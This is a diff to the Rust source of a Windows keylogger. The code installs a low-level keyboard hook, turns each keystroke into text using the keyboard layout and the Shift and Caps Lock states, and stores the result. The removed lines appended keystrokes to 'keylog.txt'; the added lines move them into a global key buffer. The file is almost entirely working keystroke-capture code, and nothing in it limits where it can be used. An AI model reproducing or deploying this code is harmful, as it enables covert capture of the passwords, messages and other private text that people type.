@@ -1,22 +1,17 @@
-use once_cell::sync::Lazy;
-use std::fs::OpenOptions;
-use std::io::{self, Write, stdout};
-use std::ptr;
-use std::sync::Mutex;
+use crate::formatting::{clear_current_line, initialize_header, update_status_header};
+use crate::process_identification::{display_focused_process_name, reset_first_call_flag};
+use crate::structs::GLOBAL_KEY_BUFFER;
 use crossterm::cursor::{position, MoveTo};
 use crossterm::ExecutableCommand;
+use std::io::{stdout, Write};
+use std::ptr;
 use windows_sys::Win32::Foundation::*;
 use windows_sys::Win32::System::Console::{FlushConsoleInputBuffer, GetStdHandle, STD_INPUT_HANDLE};
 use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
 use windows_sys::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicodeEx, VK_ESCAPE};
+use windows_sys::Win32::UI::Input::KeyboardAndMouse::{VK_CAPITAL, VK_SHIFT};
 use windows_sys::Win32::UI::WindowsAndMessaging::*;
-use windows_sys::Win32::UI::Input::KeyboardAndMouse::{VK_SHIFT, VK_CAPITAL};
-use crate::process_identification::{display_focused_process_name, reset_first_call_flag};
-use crate::formatting::{clear_current_line, initialize_header, update_status_header};
 
-
-// Static means that it lasts the entire duration of the program.
-static KEY_BUFFER: Lazy<Mutex<Vec<u16>>> = Lazy::new(|| Mutex::new(Vec::new()));
 
 pub static mut HOOK: HHOOK = ptr::null_mut();
 
@@ -64,8 +59,10 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
         let mut unicode_buffer: [u16; 8] = [0; 8];
         let mut keyboard_array: [u8; 256] = [0; 256];
         GetKeyboardState(keyboard_array.as_mut_ptr());
-
+        
+        // Check Shift and Caps Lock states
         if (GetAsyncKeyState(VK_SHIFT as i32) & 0x8000u16 as i16) != 0 {
+            // Change if the shift key is pressed
             keyboard_array[VK_SHIFT as usize] |= 0x80;
         }
         if (GetAsyncKeyState(VK_CAPITAL as i32) & 0x0001) != 0 {
@@ -73,55 +70,28 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
         }
 
         let key_pressed_struct = *(l_param as *const KBDLLHOOKSTRUCT);
-
         let layout = GetKeyboardLayout(0);
-
         let count = ToUnicodeEx(key_pressed_struct.vkCode, key_pressed_struct.scanCode, keyboard_array.as_ptr(), unicode_buffer.as_mut_ptr(), unicode_buffer.len() as i32, 0, layout);
-        
         let chars = &unicode_buffer[0..count as usize];
-        if let Ok(s) = String::from_utf16(chars) {
-            print!("{}", s);
-            io::stdout().flush().unwrap();
-            let mut key_buffer = KEY_BUFFER.lock().unwrap();
-            if key_buffer.len() >= 8 {
-                let buff = key_buffer.clone();
-
-                key_buffer.clear();
-                for char in chars {
-                    key_buffer.push(*char);
-                }
-                
-                drop(key_buffer);
-
-                log_keyboard_input(&buff);
-            } else {
-                for char in chars {
-                    key_buffer.push(*char);
-                }
-                drop(key_buffer);
-            }
-        }
+        
+        log_keyboard_input(chars);
     }
 }
 
-fn log_keyboard_input(cloned_buffer: &Vec<u16>) {
-    let mut file = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open("keylog.txt")
-        .unwrap();
-
-    if let Ok(s) = String::from_utf16(cloned_buffer) {
-        file.write_all(s.as_bytes()).unwrap();
-        clear_current_line().unwrap();
-        if let Ok((_, row)) = position() {
-            stdout().execute(MoveTo(0, row)).unwrap();
-        }
-        update_status_header("💾 Saved Buffer").unwrap();
-        stdout().flush().unwrap();
-    } else {
-        eprintln!("Failed to convert buffer to string.");
+fn log_keyboard_input(chars: &[u16]) {
+    // Clear line and move cursor to the beginning
+    clear_current_line().unwrap();
+    if let Ok((_, row)) = position() {
+        stdout().execute(MoveTo(0, row)).unwrap();
     }
+    
+    // Push characters to the global key buffer
+    GLOBAL_KEY_BUFFER.lock().unwrap().push_chars(chars).unwrap_or_else(|e| {
+        eprintln!("Failed to push characters to buffer: {}", e);
+    });
+    
+    update_status_header("💾 Saved Buffer").unwrap();
+    stdout().flush().unwrap();
 }
 
 
